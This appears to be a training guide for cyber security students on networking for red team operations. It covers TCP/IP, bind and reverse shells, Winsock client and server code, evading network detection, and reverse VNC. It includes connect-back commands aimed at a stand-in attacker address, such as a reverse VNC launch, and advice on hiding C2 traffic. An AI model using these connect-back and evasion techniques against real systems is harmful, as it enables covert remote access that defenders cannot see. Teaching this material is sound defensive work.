# Networking Concepts for Red Team Operations

> **Audience:** Cert IV Cyber Security students with basic IT knowledge  
> **Goal:** Understand the networking layer well enough to read, write, and debug offensive tooling  
> **Prerequisite:** You can ping a host, know what an IP address looks like, and have heard the word "port" before.

---

## Table of Contents

1. [TCP/IP Fundamentals](#1-tcpip-fundamentals)
2. [Reverse Shells vs Bind Shells](#2-reverse-shells-vs-bind-shells)
3. [Sockets Programming (Berkeley Sockets / Winsock)](#3-sockets-programming-berkeley-sockets--winsock)
4. [Windows Networking APIs](#4-windows-networking-apis)
5. [Network Evasion Techniques](#5-network-evasion-techniques)
6. [VNC and Remote Desktop Protocols](#6-vnc-and-remote-desktop-protocols)

---

## 1. TCP/IP Fundamentals

### 1.1 What is TCP vs UDP?

Imagine you want to send a letter to a friend.

| Protocol | Analogy | Guarantee? | Use Case |
|----------|---------|------------|----------|
| **TCP** | Registered mail with tracking and confirmation | Yes — reliable, ordered delivery | Web browsing (HTTP/HTTPS), file transfers (FTP), email |
| **UDP** | Standard postcard — no tracking, no confirmation | No — "fire and forget" | DNS queries, video streaming, online games, VoIP |

**TCP (Transmission Control Protocol)** is *connection-oriented*. Before any data is exchanged, the two hosts perform a **three-way handshake** to establish a reliable session. TCP guarantees that:
- Data arrives in the correct order.
- Lost packets are retransmitted.
- The receiver acknowledges every chunk of data.

**UDP (User Datagram Protocol)** is *connectionless*. You simply blast a packet at an IP and port. It may arrive, it may not. There is no handshake, no retransmission, no ordering guarantee. This makes UDP fast but unreliable.

> **Red Team relevance:** Reverse shells and bind shells almost always use **TCP** because you need a reliable, bidirectional stream of data. UDP shells exist but are rare because you lose the guaranteed back-and-forth conversation.

---

### 1.2 The 3-Way Handshake (SYN, SYN-ACK, ACK)

Before two computers can talk over TCP, they must agree to talk. This agreement is the **three-way handshake**.

```
Client                              Server
  |                                    |
  |  --------  SYN (seq=x)  -------->  |
  |  "I want to talk. Here is my       |
  |   initial sequence number x."      |
  |                                    |
  |  <---- SYN-ACK (seq=y, ack=x+1) ---|
  |  "I got your SYN. My sequence      |
  |   number is y, and I expect your   |
  |   next packet to be x+1."          |
  |                                    |
  |  -------- ACK (ack=y+1) ------->   |
  |  "I got your SYN-ACK. I expect     |
  |   your next packet to be y+1."     |
  |                                    |
  [Connection Established — ESTABLISHED]
```

**Step-by-step breakdown:**

1. **SYN (Synchronize)** — The client sends a TCP packet with the `SYN` flag set to the server's IP and port. It includes a random 32-bit number called the **Initial Sequence Number (ISN)**.
2. **SYN-ACK (Synchronize-Acknowledge)** — If the server is listening on that port, it replies with a packet that has both `SYN` and `ACK` flags set. It sends its own ISN (`seq=y`) and acknowledges the client's ISN by setting `ack=x+1`.
3. **ACK (Acknowledge)** — The client sends back a packet with only the `ACK` flag set, acknowledging the server's ISN with `ack=y+1`.

After this exchange, both sides have synchronized their sequence numbers, and a **full-duplex** (bidirectional) communication channel is open.

> **Red Team relevance:**
> - Firewalls can block outgoing `SYN` packets (stop reverse shells).
> - IDS/IPS systems often flag scans that send `SYN` without completing the handshake (half-open scans).
> - The `SYN` flood attack exploits this handshake by never sending the final `ACK`, leaving the server with half-open connections.

---

### 1.3 IP Addresses, Subnets, and Ports

#### IP Addresses

An **IPv4 address** is a 32-bit number, usually written as four decimal octets separated by dots:

```
192.168.1.10
```

Each octet is 8 bits (0–255), so the full range is `0.0.0.0` to `255.255.255.255`.

In memory, this same address is stored as a **4-byte integer** in **network byte order** (big-endian):

```
192  168    1     10
0xC0 0xA8 0x01 0x0A

Combined: 0xC0A8010A (3232235786 in decimal)
```

> **Key concept — Network Byte Order:** Big-endian means the most significant byte comes first. x86/x64 CPUs are little-endian (least significant byte first). This is why we use `htons()` and `htonl()` when filling socket structures — more on that in Section 3.

#### Subnets and CIDR Notation

A **subnet mask** defines which part of an IP address is the *network* portion and which part identifies the *host*.

```
IP:      192.168.1.10
Mask:    255.255.255.0  (/24 in CIDR notation)
Network: 192.168.1.0
Host:    .10
```

The `/24` means the first 24 bits are the network. In a home lab, you will almost always see `/24` subnets (`255.255.255.0`), giving you 254 usable host addresses (`.1` through `.254`).

#### Ports

A **port** is a 16-bit number (0–65535) that identifies a specific service or application on a host.

| Range | Name | Examples |
|-------|------|----------|
| 0–1023 | Well-known ports | 22 (SSH), 80 (HTTP), 443 (HTTPS) |
| 1024–49151 | Registered ports | 3389 (RDP), 5900 (VNC), 8080 (HTTP-alt) |
| 49152–65535 | Dynamic / Private ports | Ephemeral client ports |

Think of the IP address as a street address and the port as an apartment number. The combination `192.168.1.10:4444` means "apartment 4444 at 192.168.1.10."

> **Red Team relevance:** You need to know both IP and port to connect. If the target is behind NAT, its *internal* IP (e.g., `10.0.0.5`) is different from its *public* IP (e.g., `203.0.113.45`). Reverse shells solve the NAT problem by having the *target* initiate the outbound connection.

---

### 1.4 Client-Server Model vs Peer-to-Peer

#### Client-Server

In the **client-server model**, one program (the *server*) listens passively on a well-known port, waiting for connections. Another program (the *client*) actively initiates a connection to the server.

```
+----------+              +----------+
|  Client  |  --------->  |  Server  |
| (active) |   connects   | (passive)|
+----------+              +----------+
   asks for data             listens on
   192.168.1.10:80          0.0.0.0:80
```

Examples: Web browsers (clients) talking to Apache/Nginx (servers); SSH clients talking to `sshd`.

#### Peer-to-Peer (P2P)

In **P2P**, every node can act as both client and server. There is no central authority. BitTorrent is the classic example.

```
   +--------+         +--------+
   | Peer A | <-----> | Peer B |
   +--------+         +--------+
       ^                  ^
       |                  |
       v                  v
   +--------+         +--------+
   | Peer C | <-----> | Peer D |
   +--------+         +--------+
```

> **Red Team relevance:** Most malware uses the client-server model. The victim machine acts as a *client* connecting back to the attacker's *command-and-control (C2) server*. However, some modern botnets use P2P C2 to be resilient against takedowns.

---

## 2. Reverse Shells vs Bind Shells

A **shell** in this context means access to a command interpreter (`cmd.exe` on Windows, `/bin/sh` on Linux). The question is: *who initiates the network connection to get that shell?*

---

### 2.1 What is a Bind Shell?

In a **bind shell**, the *target machine* (victim) opens a listening socket and waits. The *attacker* actively connects to it.

```
Attacker Machine                    Target/Victim Machine
+----------------+                  +--------------------+
| nc 10.0.0.5    |  ---------->     | malware.exe listens|
|    4444        |   connects to    | on 0.0.0.0:4444    |
+----------------+                  +--------------------+
      |                                       |
      v                                       v
  [Gets shell]                          [spawns cmd.exe]
```

**Flow:**
1. Malware on the target calls `socket()`, `bind()`, `listen()`, and `accept()`.
2. The attacker runs a tool like `nc` (netcat) or Metasploit's `multi/handler` to connect.
3. Upon connection, the target redirects `stdin`, `stdout`, and `stderr` of `cmd.exe` into the socket.
4. The attacker now has a remote shell.

**Why bind shells are problematic today:**
- **Firewalls** on the target network usually block *inbound* connections to high ports like 4444.
- **NAT (Network Address Translation)** means the target's internal IP is not publicly routable. The attacker cannot directly reach `10.0.0.5` from the internet.
- **Host-based firewalls** (Windows Defender Firewall) will often prompt the user or silently block unknown listening applications.

---

### 2.2 What is a Reverse Shell?

In a **reverse shell**, the *attacker machine* listens, and the *target machine* connects **back** to the attacker.

```
Attacker Machine                    Target/Victim Machine
+----------------+                  +--------------------+
| nc -lvnp 4444  |  <----------     | malware.exe calls  |
| (listens on    |   target connects| connect() to       |
|  0.0.0.0:4444) |    back          | 203.0.113.45:4444  |
+----------------+                  +--------------------+
      |                                       |
      v                                       v
  [Gets shell]                          [spawns cmd.exe]
```

**Flow:**
1. The attacker sets up a listener on their public IP (or a C2 server).
2. Malware on the target calls `socket()`, `connect()` to the attacker's IP and port.
3. The target then redirects `cmd.exe`'s I/O into the socket.
4. Because the connection is *outbound* from the target, it looks like a normal client connection and is far more likely to succeed.

**Why reverse shells are preferred:**
- **NAT-friendly:** The target initiates the connection, so only the attacker needs a public IP.
- **Firewall-friendly:** Outbound connections are typically allowed (users need to browse the web, download updates, etc.).
- **Stealthier:** The target does not have an open listening port that a port scan would discover.

---

### 2.3 Diagram: Connection Direction Comparison

```
╔═══════════════════════════════════════════════════════════════════════╗
║                         BIND SHELL                                    ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║    Attacker (Client)          TCP Flow          Target (Server)       ║
║    203.0.113.45  ──────────────────────────►   10.0.0.5:4444          ║
║         │              SYN ─────────────────►        │                ║
║         │         ◄──────────── SYN-ACK              │                ║
║         │              ACK ─────────────────►        │                ║
║         │         ◄────────── DATA (shell)           │                ║
║         │                                            │                ║
║    [connect()]                                  [bind()->listen()]    ║
║                                                                       ║
║    ⚠️ BLOCKED by inbound firewalls, NAT, host firewall               ║
╚═══════════════════════════════════════════════════════════════════════╝

╔═══════════════════════════════════════════════════════════════════════╗
║                       REVERSE SHELL                                   ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║    Attacker (Server)          TCP Flow          Target (Client)       ║
║    203.0.113.45:4444 ◄────────────────────────  10.0.0.5              ║
║         │         ◄──────────────── SYN              │                ║
║         │              SYN-ACK ────────────────►     │                ║
║         │         ◄──────────────── ACK              │                ║
║         │         ◄────────── DATA (shell)           │                ║
║         │                                            │                ║
║    [bind()->listen()]                           [connect()]           ║
║                                                                       ║
║    ✅ ALLOWED because outbound connections look like normal traffic   ║
╚═══════════════════════════════════════════════════════════════════════╝
```

---

## 3. Sockets Programming (Berkeley Sockets / Winsock)

### 3.1 What is a Socket?

A **socket** is an abstraction — an endpoint for sending and receiving data across a network. Think of it like a **file descriptor** (on Linux) or a **handle** (on Windows) that represents one end of a network connection.

When you create a socket, the operating system gives you a small integer (or handle) that you can use with `send()`, `recv()`, `connect()`, etc.

There are two main socket types:
- **SOCK_STREAM** — TCP (reliable, connection-oriented, bidirectional stream).
- **SOCK_DGRAM** — UDP (unreliable, connectionless, message-based).

---

### 3.2 The Server Lifecycle: socket() → bind() → listen() → accept() → send/recv

This is the sequence a **bind shell** or any server application uses:

```c
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);   // Initialize Winsock

    // 1. socket() — Create an endpoint for communication
    //    AF_INET     = IPv4
    //    SOCK_STREAM = TCP
    //    IPPROTO_TCP = TCP protocol (0 also works)
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // 2. bind() — Assign a local address (IP + port) to the socket
    struct sockaddr_in localAddr;
    localAddr.sin_family      = AF_INET;
    localAddr.sin_port        = htons(4444);          // Port in network byte order
    localAddr.sin_addr.s_addr = inet_addr("0.0.0.0"); // INADDR_ANY — listen on all interfaces

    bind(sock, (struct sockaddr *)&localAddr, sizeof(localAddr));

    // 3. listen() — Mark the socket as passive, ready to accept connections
    //    The second argument is the "backlog" — how many pending connections to queue
    listen(sock, 1);

    // 4. accept() — Block until a client connects. Returns a NEW socket for that client.
    struct sockaddr_in clientAddr;
    int clientLen = sizeof(clientAddr);
    SOCKET clientSock = accept(sock, (struct sockaddr *)&clientAddr, &clientLen);

    printf("Client connected from %s:%d\n",
           inet_ntoa(clientAddr.sin_addr),
           ntohs(clientAddr.sin_port));

    // 5. send() / recv() — Exchange data
    char buffer[1024];
    int received = recv(clientSock, buffer, sizeof(buffer), 0);
    send(clientSock, "Hello from server!\n", 19, 0);

    // Cleanup
    closesocket(clientSock);
    closesocket(sock);
    WSACleanup();
    return 0;
}
```

**Function-by-function explanation:**

| Function | Purpose |
|----------|---------|
| `socket()` | Creates a new socket and returns its handle. Think of it as `fopen()` but for networking. |
| `bind()` | Attaches the socket to a specific local IP and port. Without this, the OS doesn't know where to receive data. |
| `listen()` | Transitions the socket from an active (client) role to a passive (server) role. |
| `accept()` | Blocks the program until a client connects. Returns a **new** socket specifically for that client, leaving the original socket free to accept more clients. |
| `recv()` | Reads data from the socket into a buffer. Returns the number of bytes read, 0 if the peer closed the connection, or `SOCKET_ERROR` on failure. |
| `send()` | Writes data from a buffer to the socket. Returns the number of bytes actually sent. |

---

### 3.3 The Client Lifecycle: socket() → connect() → send/recv

This is what a **reverse shell** uses:

```c
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // 1. socket() — Create the socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    // 2. connect() — Initiate the 3-way handshake to the remote host
    struct sockaddr_in serverAddr;
    serverAddr.sin_family      = AF_INET;
    serverAddr.sin_port        = htons(4444);
    serverAddr.sin_addr.s_addr = inet_addr("203.0.113.45");

    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Connection failed!\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connected to C2!\n");

    // 3. send() / recv()
    send(sock, "Hello from victim!\n", 19, 0);

    char buffer[1024];
    int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (received > 0) {
        buffer[received] = '\0';
        printf("Received: %s\n", buffer);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
```

**The key difference:** The client does **not** call `bind()` or `listen()`. It simply creates a socket and immediately tries to `connect()` to a remote address. The OS automatically assigns an ephemeral local port for the outbound connection.

---

### 3.4 sockaddr_in Structure Explained Byte-by-Byte

The `sockaddr_in` structure is how you tell the socket API what IP address and port to use. It lives in `<winsock2.h>` and `<netinet/in.h>` (Linux).

```c
struct sockaddr_in {
    short          sin_family;   // Address family (AF_INET = IPv4)
    unsigned short sin_port;     // Port number (network byte order)
    struct in_addr sin_addr;     // IPv4 address (network byte order)
    char           sin_zero[8];  // Padding to match size of sockaddr (16 bytes)
};
```

**Memory layout (16 bytes total):**

```
Offset   Size   Field         Example Value (hex)
─────────────────────────────────────────────────────
 0       2      sin_family    02 00     (AF_INET = 2)
 2       2      sin_port      11 5C     (htons(4444) = 0x115C)
 4       4      sin_addr      C0 A8 01 0A (192.168.1.10)
 8       8      sin_zero      00 00 00 00 00 00 00 00
```

**Important:** The total size of `sockaddr_in` is 16 bytes. This is the same size as the older `struct sockaddr`, which is why you always cast `&serverAddr` to `(struct sockaddr *)` when passing it to `bind()`, `connect()`, or `accept()`.

---

### 3.5 htons(), inet_addr(), inet_ntoa()

These functions exist because computers disagree on byte order.

#### Byte Order Problem

Your Intel/AMD CPU stores multi-byte integers in **little-endian** order (least significant byte first). Network protocols use **big-endian** (most significant byte first).

```
Port 4444 in memory:
┌─────────────────────────────────────────────┐
│  Host (little-endian):  5C 11  (0x5C11)     │
│  Network (big-endian):  11 5C  (0x115C)     │
└─────────────────────────────────────────────┘
```

If you forget to convert, the remote host will interpret the port as `17472` instead of `4444`.

#### The Conversion Functions

| Function | Meaning | Direction |
|----------|---------|-----------|
| `htons()` | **Host** to **Network** **S**hort (16-bit) | Port numbers |
| `htonl()` | **Host** to **Network** **L**ong (32-bit) | IPv4 addresses |
| `ntohs()` | **N**etwork to **H**ost **S**hort | Convert port back |
| `ntohl()` | **N**etwork to **H**ost **L**ong | Convert address back |

```c
unsigned short hostPort = 4444;
unsigned short netPort  = htons(hostPort);   // 0x115C

unsigned long hostIP = 0xC0A8010A;           // 192.168.1.10
unsigned long netIP  = htonl(hostIP);        // Same on big-endian, swapped on x86
```

#### inet_addr() and inet_ntoa()

| Function | Purpose |
|----------|---------|
| `inet_addr("192.168.1.10")` | Converts a dotted-decimal string to a 32-bit integer **in network byte order**. Returns `INADDR_NONE` on error. |
| `inet_ntoa(some_addr)` | Converts a 32-bit network-ordered integer back to a dotted-decimal string. Returns a `char *` to a static buffer. |

```c
// String -> 32-bit integer
unsigned long ip = inet_addr("127.0.0.1");   // Returns 0x0100007F

// 32-bit integer -> string (for display only)
struct in_addr addr;
addr.s_addr = inet_addr("192.168.1.10");
printf("IP: %s\n", inet_ntoa(addr));         // Prints "192.168.1.10"
```

> **Note:** `inet_ntoa()` is not thread-safe because it returns a pointer to a static internal buffer. Modern code prefers `inet_ntop()` / `InetNtop()`, but you will still see `inet_ntoa()` in older malware and tutorials.

---

## 4. Windows Networking APIs

### 4.1 Winsock2 (ws2_32.dll) vs BSD Sockets

On Linux and macOS, socket programming uses **BSD Sockets** — the API originated in BSD Unix in the 1980s. On Windows, Microsoft implemented a compatible but distinct API called **Winsock** (Windows Sockets).

**Key differences:**

| Feature | BSD Sockets (Linux) | Winsock2 (Windows) |
|---------|---------------------|--------------------|
| Header | `<sys/socket.h>`, `<netinet/in.h>`, `<arpa/inet.h>` | `<winsock2.h>` |
| Socket type | `int` | `SOCKET` (actually `UINT_PTR`) |
| Error value | `-1` | `SOCKET_ERROR` (defined as `-1`) |
| Invalid socket | `-1` | `INVALID_SOCKET` |
| Close function | `close()` | `closesocket()` |
| Initialization | None needed | `WSAStartup()` required |
| Cleanup | Nothing special | `WSACleanup()` required |
| Library link | Automatic | Must link `ws2_32.lib` |

Despite these differences, the core functions (`socket`, `bind`, `listen`, `accept`, `connect`, `send`, `recv`) have identical signatures and behavior. This makes it relatively easy to port networking code between platforms.

---

### 4.2 WSAStartup() and WSACleanup()

Windows requires every process that uses Winsock to **initialize** the library before calling any socket functions and **clean up** when done.

```c
#include <winsock2.h>

WSADATA wsaData;
int result = WSAStartup(MAKEWORD(2, 2), &wsaData);

if (result != 0) {
    printf("WSAStartup failed: %d\n", result);
    return 1;
}

// ... all your socket code goes here ...

WSACleanup();
```

**What is `WSADATA`?**

It is a structure that Winsock fills with information about the implementation — version numbers, vendor description, maximum sockets allowed, etc. You rarely inspect its contents; you just pass it in.

**What is `MAKEWORD(2, 2)`?**

This macro constructs a 16-bit version number. `MAKEWORD(2, 2)` means "Winsock version 2.2." You can also request version 2.0 with `MAKEWORD(2, 0)`.

```c
// MAKEWORD expands to: (BYTE)(((WORD)(low)) | ((WORD)((BYTE)(high))) << 8)
// MAKEWORD(2, 2) = 0x0202
```

---

### 4.3 Why Windows Sockets Need Initialization

Unlike Unix where sockets are a first-class operating system feature, Windows implements Winsock as a **user-mode DLL** (`ws2_32.dll`) that talks to kernel-mode drivers. `WSAStartup()` does the following:

1. Loads the Winsock DLL into the process address space.
2. Negotiates the API version (so your code and the DLL agree on what functions exist).
3. Allocates any per-process resources Winsock needs internally.
4. Initializes internal lookup tables and thunk layers.

If you forget to call `WSAStartup()`, every subsequent Winsock call will fail with error `WSANOTINITIALISED` (10093).

> **Red Team relevance:** If you see malware that crashes immediately on a clean VM but works on a development machine, it might be because the developer forgot `WSAStartup()` and some other library already initialized Winsock on their machine.

---

## 5. Network Evasion Techniques

### 5.1 Using Common Ports (80, 443, 8080) to Blend In

Network defenders monitor traffic for anomalies. A connection to port `4444` from a workstation to the internet is highly unusual. A connection to port `443` (HTTPS) is completely normal.

| Port | Service | Why it blends in |
|------|---------|-----------------|
| **80** | HTTP | Every web request uses this. Firewalls almost never block outbound 80. |
| **443** | HTTPS | Encrypted web traffic. Modern malware loves 443 because encryption hides payloads from IDS. |
| **8080** | HTTP alternate | Used by proxies and many web apps. Common in corporate environments. |
| **53** | DNS | Rarely blocked. Used for DNS tunneling (hiding data inside DNS queries). |

**Technique:** Configure your reverse shell to connect back on port 443. To a firewall or IDS, it looks like the user is visiting a secure website.

```c
#define LISTENER_PORT 443   // Blends in as HTTPS
```

> **Advanced:** Combine this with **SSL/TLS encryption** so the traffic actually *is* HTTPS, making deep-packet inspection far harder.

---

### 5.2 Why Port 4444 is Suspicious

Port `4444` has become the **default port for Metasploit** (the world's most popular penetration testing framework). Because of this:

- Every IDS/IPS signature database flags traffic to/from 4444.
- SOC analysts are trained to treat 4444 as malicious on sight.
- Many firewalls block 4444 by default in enterprise environments.
- Even amateur threat hunters grep their logs for `4444`.

**The lesson:** Never use default ports in a real operation. Always choose a port that matches the expected traffic profile of the target environment.

---

### 5.3 Protocol Tunneling Basics

**Tunneling** is the act of encapsulating one protocol inside another to hide it.

**Examples:**

1. **HTTP Tunneling** — Wrap your C2 commands inside HTTP POST requests and responses. The traffic looks like normal web browsing.
2. **DNS Tunneling** — Encode data inside DNS query names (e.g., `base64data.attacker.com`). DNS is UDP-based and almost never blocked.
3. **ICMP Tunneling** — Hide data inside ICMP echo request/reply packets (ping). Many firewalls allow all ICMP for troubleshooting.
4. **SSH Tunneling (Port Forwarding)** — Route traffic through an encrypted SSH connection to bypass firewalls.

```
Normal reverse shell:
[Target] ──TCP:4444──► [Attacker]        ← OBVIOUS

HTTP-tunneled shell:
[Target] ──TCP:80──► [Proxy] ──HTTP POST──► [Attacker]   ← LOOKS NORMAL
```

> **Red Team relevance:** Sophisticated malware (e.g., Cobalt Strike) uses HTTPS beaconing — periodic encrypted HTTPS requests to a C2 server — precisely because it looks identical to legitimate web traffic.

---

## 5.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Using port 8080 or 8890 for a reverse shell is "blending in" because these ports are commonly used for web proxies.

**What the lab hides from you:** Enterprise proxies do not just check the port — they **inspect the protocol**. A raw TCP connection on port 8080 does not speak HTTP — the proxy drops it immediately. Enterprise firewalls use **next-generation inspection** that identifies protocols by behavior, not port number. Outbound 8080 without HTTP headers is an instant alert. NGFWs (Next-Generation Firewalls) and SWGs (Secure Web Gateways) decrypt HTTPS, inspect content, and block unknown applications.

### How Network Evasion Dies in Production

| Defense | How It Kills This Approach | Your Lab Bypass |
|---------|---------------------------|-----------------|
| Enterprise proxy | Inspects protocol; raw TCP on 8080 is not HTTP | No proxy in lab |
| NGFW protocol identification | Identifies traffic by behavior, not port | No NGFW in lab |
| SWG (Secure Web Gateway) | Decrypts HTTPS, inspects content, blocks unknown apps | No SWG in lab |
| DNS filtering | Blocks known malicious domains; DGA detection | No DNS filtering |
| Network segmentation | VLANs restrict east-west traffic | Flat network |
| EDR network telemetry | Correlates network connections with process behavior | No EDR |

### What a Professional Red Teamer Would Do

**Instead of raw TCP on arbitrary ports, they would:**
- **HTTPS C2 with domain fronting** — traffic looks like legitimate CDN requests, survives proxy inspection
- **DNS over HTTPS (DoH)** — DNS queries inside HTTPS to `cloudflare-dns.com`; bypasses DNS filtering
- **Domain Generation Algorithm (DGA)** — thousands of candidate domains; prevents takedown
- **C2 over legitimate cloud services** — Slack, Discord, GitHub Issues, Twitter DMs — traffic blends into normal SaaS usage

**Key difference:** The pro does not try to "hide" on a port. They hide inside a **protocol that the enterprise already allows and inspects** — and they make their traffic indistinguishable from legitimate use of that protocol.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| HTTPS C2 with malleable profiles | Blends into normal web traffic | Cobalt Strike Malleable C2 profiles |
| Domain fronting | Hides true destination behind CDN | Vincent Yiu: "Domain Fronting via CDN" |
| DoH / DoT | Bypasses DNS filtering and inspection | RFC 8484 (DoH), RFC 7858 (DoT) |
| Cloud-native C2 | Uses legitimate SaaS as C2 channel | GitHub: `mgeeky/RedWarden` |

### The Honest Bottom Line

> This networking guide teaches TCP/IP fundamentals, socket programming, and basic port selection. It does not teach network evasion. In the real world, port 8080 without HTTP is **more suspicious** than port 44444 with proper HTTP headers. The value is understanding how networks work. Learn HTTPS C2, domain fronting, and protocol tunneling next.

---

## 6. VNC and Remote Desktop Protocols

### 6.1 How VNC Works (Framebuffer, RFB Protocol)

**VNC (Virtual Network Computing)** is a cross-platform remote desktop protocol. Unlike Microsoft's RDP, VNC is platform-agnostic and works on Windows, Linux, and macOS.

#### The RFB Protocol

VNC uses the **RFB (Remote Framebuffer)** protocol. The name tells you exactly what it does:

1. The **server** (running on the target machine) captures the screen contents as a **framebuffer** — a raw bitmap representing every pixel on the screen.
2. The **viewer** (running on the attacker's machine) connects and requests screen updates.
3. The server sends only the *changed* rectangular regions of the screen (not the entire screen every time), compressing them with various encodings.
4. The viewer displays the framebuffer and sends mouse movements and keyboard events back to the server.

```
+-------------+                  +-------------+
|   Viewer    |  <── Framebuffer ──  |   Server    |
|  (Client)   |  ── Mouse/Keys ──►  |  (Target)   |
+-------------+     TCP:5900        +-------------+
```

**Key characteristics:**
- VNC operates at the **framebuffer level**, not the windowing-system level. This means it works regardless of whether anyone is logged in.
- It is generally slower than RDP because it transmits raw bitmap data rather than drawing instructions.
- Authentication is typically a simple password (often limited to 8 characters in older implementations).

---

### 6.2 Reverse VNC vs Standard VNC

#### Standard VNC

In standard VNC, the **viewer initiates the connection** to the server, just like a bind shell.

```
Attacker Viewer          TCP:5900          Target Server
  ┌─────────┐        ─────────────►       ┌─────────┐
  │ connects│                             │ listens │
  └─────────┘                             └─────────┘
```

**Problem:** If the target is behind NAT or a firewall, the attacker cannot reach the target's port 5900.

#### Reverse VNC

In **reverse VNC** (sometimes called "listening viewer" or "add new client" mode), the roles are flipped:

1. The attacker starts the VNC viewer in **listen mode** (`vncviewer -listen`).
2. The target runs a VNC server configured to **connect back** to the attacker's IP.
3. The server initiates the TCP connection, then acts as a normal VNC server over that connection.

```
Attacker Viewer (Listen)     TCP:5500      Target Server (Reverse)
  ┌─────────┐        ◄─────────────────       ┌─────────┐
  │ listens │                                 │ connects│
  │ on 5500 │                                 │  back   │
  └─────────┘                                 └─────────┘
```

**Why this matters:**
- It bypasses NAT and inbound firewalls on the target, just like a reverse shell.
- It is a common post-exploitation technique: once you have a shell, you can spawn a reverse VNC connection to get a graphical desktop.
- The default listen port for reverse VNC is **5500**.

---

### 6.3 TightVNC Server/Viewer Architecture

**TightVNC** is an open-source VNC implementation optimized for low-bandwidth connections. It introduces its own compression algorithms ("Tight encoding") that perform better than standard VNC over slow links.

#### Architecture

```
┌───────────────────────────────────────────────────────────────┐
│                    TIGHTVNC SERVER (Target)                    │
│  ┌─────────────┐    ┌──────────────┐    ┌─────────────────┐  │
│  │  WinVNC.exe │───►│  VNC Server  │───►│  TCP Listener   │  │
│  │  (Service)  │    │  (Hooks into │    │  (Port 5900)    │  │
│  │             │◄───│   display)   │◄───│                 │  │
│  └─────────────┘    └──────────────┘    └─────────────────┘  │
│         ▲                              ▲                     │
│         │         ┌──────────┐         │                     │
│         └─────────┤  Client  ├─────────┘                     │
│                   │  Socket  │                                │
│                   └──────────┘                                │
└───────────────────────────────────────────────────────────────┘
                              │
                              │ TCP Connection
                              ▼
┌───────────────────────────────────────────────────────────────┐
│                   TIGHTVNC VIEWER (Attacker)                   │
│  ┌─────────────┐    ┌──────────────┐    ┌─────────────────┐  │
│  │  vncviewer  │───►│  Decode/Draw │───►│  Display Window │  │
│  │             │◄───│  Framebuffer │◄───│  (Win32/X11)    │  │
│  └─────────────┘    └──────────────┘    └─────────────────┘  │
│         ▲                              ▲                     │
│         │         ┌──────────┐         │                     │
│         └─────────┤  Server  ├─────────┘                     │
│                   │  Socket  │                                │
│                   └──────────┘                                │
└───────────────────────────────────────────────────────────────┘
```

**Practical usage in Red Teaming:**

1. **Standard mode:** `vncviewer.exe 192.168.1.10:5900` — connect to a listening server.
2. **Reverse mode:** `vncviewer.exe -listen 5500` — wait for the server to connect back.
3. **Server reverse connection:** `winvnc.exe -connect 203.0.113.45::5500` — connect back to the listener.

> **Note the double colon (`::`)** in some TightVNC command lines — it is used to separate the host from the display number in reverse connection syntax.

---

## Quick Reference Cheat Sheet

| Concept | One-Liner |
|---------|-----------|
| TCP | Reliable, ordered, connection-oriented (uses 3-way handshake) |
| UDP | Fast, unreliable, connectionless |
| SYN | "I want to start a connection" |
| SYN-ACK | "I got your SYN; let's talk" |
| ACK | "I acknowledge your data" |
| Bind shell | Target listens; attacker connects **inbound** |
| Reverse shell | Attacker listens; target connects **outbound** |
| `socket()` | Create a communication endpoint |
| `bind()` | Assign a local address to the socket |
| `listen()` | Mark socket as passive (server mode) |
| `accept()` | Accept an incoming client connection |
| `connect()` | Initiate an outbound connection |
| `htons()` | Convert port to network byte order |
| `inet_addr()` | Convert dotted IP string to 32-bit integer |
| `WSAStartup()` | Initialize Winsock on Windows |
| `WSACleanup()` | Release Winsock resources |
| Port 4444 | Metasploit default — **always suspicious** |
| Port 443 | HTTPS — **blends in** |
| VNC | Framebuffer-based remote desktop (port 5900) |
| Reverse VNC | Server connects back to viewer (port 5500) |

---

*End of Document*
